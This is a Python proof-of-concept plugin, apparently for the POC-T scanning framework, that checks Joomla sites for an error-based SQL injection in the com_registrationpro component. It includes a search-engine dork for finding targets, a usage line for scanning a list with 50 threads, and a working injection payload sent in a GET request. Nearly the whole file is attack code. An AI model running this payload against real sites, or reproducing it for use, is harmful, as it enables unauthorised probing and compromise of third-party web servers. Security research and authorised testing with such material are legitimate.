#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
Joomla com_registrationpro SQL injection Vulnerability

Dork
  inurl:index.php?option=com_registrationpro
version
  3.2.12 - 3.2.10
Type
  boolean-based blind & error-based
Usage
  python POC-T.py -T -m joomla-registrationpro-sqli -f ./data/joomla.txt -t 50

"""

import requests
from plugin.urlparser import iterate_path
from plugin.util import randomMD5


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    for each in iterate_path(url):
        plain, cipher = randomMD5(3)
        payload = "/index.php?option=com_registrationpro&view=calendar&Itemid=27&listview=2&month=6&year=1 AND (SELECT 7804 FROM(SELECT COUNT(*),CONCAT(0x7176786b71,(MID((IFNULL(CAST(md5({plain}) AS CHAR),0x20)),1,54)),0x716b707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)".format(plain=plain)
        if '?' in each:
            continue
        target_url = url.rstrip('/') + payload
        try:
            r = requests.get(target_url, timeout=10)
            if cipher in r.content:
                return each
        except Exception, e:
            pass
    return False
